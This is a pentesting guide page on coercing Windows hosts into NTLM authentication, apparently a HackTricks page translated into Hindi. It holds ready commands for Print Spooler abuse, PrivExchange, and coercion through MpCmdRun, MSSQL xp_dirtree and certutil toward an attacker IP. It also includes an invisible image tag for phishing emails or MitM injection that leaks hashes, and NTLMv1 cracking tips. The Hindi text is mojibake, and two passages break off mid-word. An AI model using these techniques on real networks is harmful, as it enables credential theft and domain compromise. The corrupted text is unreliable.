# Force NTLM рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks_live)**ред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред**

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) рдПрдХ **рд╕рдВрдЧреНрд░рд╣** рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рд░рд┐рдореЛрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЯреНрд░рд┐рдЧрд░** рд╣реИрдВ рдЬреЛ MIDL рдХрдВрдкрд╛рдЗрд▓рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ C# рдореЗрдВ рдХреЛрдб рдХрд┐рдП рдЧрдП рд╣реИрдВ рддрд╛рдХрд┐ 3rd рдкрд╛рд░реНрдЯреА рдирд┐рд░реНрднрд░рддрд╛ рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗред

## Spooler Service Abuse

рдпрджрд┐ _**рдкреНрд░рд┐рдВрдЯ рд╕реНрдкреВрд▓рд░**_ рд╕реЗрд╡рд╛ **рд╕рдХреНрд░рд┐рдп** рд╣реИ, рддреЛ рдЖрдк AD рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЗ рдкреНрд░рд┐рдВрдЯ рд╕рд░реНрд╡рд░ рд╕реЗ рдирдП рдкреНрд░рд┐рдВрдЯ рдЬреЙрдмреНрд╕ рдкрд░ **рдЕрдкрдб
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### рд╕реНрдкреВрд▓рд░ рд╕реЗрд╡рд╛рдПрдВ рд╕реБрди рд░рд╣реА рд╣реИрдВ

рдПрдХ рдереЛрдбрд╝рд╛ рд╕рд╛ рд╕рдВрд╢реЛрдзрд┐рдд @mysmartlogin's (рд╡рд┐рдиреНрд╕реЗрдВрдЯ рд▓реЗ рдЯреВрдХреНрд╕) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╕реНрдкреВрд▓рд░ рд╕реЗрд╡рд╛ рд╕реБрди рд░рд╣реА рд╣реИ:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
рдЖрдк рд▓рд┐рдирдХреНрд╕ рдкрд░ rpcdump.py рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ MS-RPRN Protocol рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### рдХрд┐рд╕реА рднреА рд╣реЛрд╕реНрдЯ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реЗрд╡рд╛ рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛ рд╕реЗ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВ

рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ [**SpoolSample рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**ред**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
рдпрд╛ [**3xocyte рдХрд╛ dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) рдпрд╛ [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЕрдЧрд░ рдЖрдк Linux рдкрд░ рд╣реИрдВред
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рдЕрдиреБрдордВрдбрд▓рди рдХреЗ рд╕рд╛рде рд╕рдВрдпреЛрдЬрди

рдпрджрд┐ рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдиреЗ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА [рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рдЕрдиреБрдордВрдбрд▓рди](unconstrained-delegation.md) рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рдХрдВрдкреНрд░рдорд╛рдЗрдЬ рдХрд░ рд▓рд┐рдпрд╛ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ **рдкреНрд░рд┐рдВрдЯрд░ рдХреЛ рдЗрд╕ рдХрдВрдкреНрдпреВрдЯрд░ рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рдЕрдиреБрдордВрдбрд▓рди рдХреЗ рдХрд╛рд░рдг, **рдкреНрд░рд┐рдВрдЯрд░ рдХреЗ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдХрд╛ TGT** рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рдЕрдиреБрдордВрдбрд▓рди рд╡рд╛рд▓реЗ рдХрдВрдкреНрдпреВрдЯрд░ рдХреА рдореЗрдореЛрд░реА рдореЗрдВ **рд╕рд╣реЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛**ред рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдиреЗ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЗрд╕ рд╣реЛрд╕реНрдЯ рдХреЛ рдХрдВрдкреНрд░рдорд╛рдЗрдЬ рдХрд░ рд▓рд┐рдпрд╛ рд╣реИ, рд╡рд╣ **рдЗрд╕ рдЯрд┐рдХрдЯ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд** рдХрд░ рд╕рдХреЗрдЧрд╛ рдФрд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдЧрд╛ ([рдЯрд┐рдХрдЯ рдкрд╛рд╕](pass-the-ticket.md))ред

## RCP рдмрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange` рд╣рдорд▓рд╛ рдПрдХ рджреЛрд╖ рдХрд╛ рдкрд░рд┐рдгрд╛рдо рд╣реИ рдЬреЛ **рдПрдХреНрд╕рдЪреЗрдВрдЬ рд╕рд░реНрд╡рд░ `PushSubscription` рд╡рд┐рд╢реЗрд╖рддрд╛** рдореЗрдВ рдкрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рд╡рд┐рд╢реЗрд╖рддрд╛ рдПрдХреНрд╕рдЪреЗрдВрдЬ рд╕рд░реНрд╡рд░ рдХреЛ рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдмрд╛рдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ HTTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рд╕реА рднреА рдХреНрд▓рд╛рдЗрдВрдЯ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╣реЛрд╕реНрдЯ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХреГрдд рдХрд░ рд╕рдХреЗред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, **рдПрдХреНрд╕рдЪреЗрдВрдЬ рд╕реЗрд╡рд╛ SYSTEM рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рддреА рд╣реИ** рдФрд░ рдЗрд╕реЗ рдЕрддреНрдпрдзрд┐рдХ рдЕрдзрд┐рдХрд╛рд░ (рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, **рдбреЛрдореЗрди рдкреВрд░реНрд╡-2019 рд╕рдВрдЪрдпреА рдЕрдкрдб
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
рдпрд╛ рдЗрд╕ рджреВрд╕рд░реА рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Certutil.exe lolbin (Microsoft-signed binary) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдмрд▓рдкреВрд░реНрд╡рдХ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML рдЗрдиреНрдЬреЗрдХреНрд╢рди

### рдИрдореЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ **рдИрдореЗрд▓ рдкрддрд╛** рд╣реИ рдЬреЛ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрд╕реЗ рдПрдХ **1x1 рдЫрд╡рд┐ рдХреЗ рд╕рд╛рде рдИрдореЗрд▓** рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
### MitM

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ MitM рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ рдкреЗрдЬ рдореЗрдВ HTML рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рд╡рд╣ рджреЗрдЦреЗрдЧрд╛, рддреЛ рдЖрдк рдкреЗрдЬ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░рд╣ рдХреА рдЫрд╡рд┐ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1 рдХреНрд░реИрдХрд┐рдВрдЧ

рдЕрдЧрд░ рдЖрдк [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack) рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
_рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ NTLMv1 рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рд░рд┐рд╕реНрдкреЙрдВрдбрд░ рдЪреИрд▓реЗрдВрдЬ рдХреЛ "1122334455667788" рдкрд░ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛_
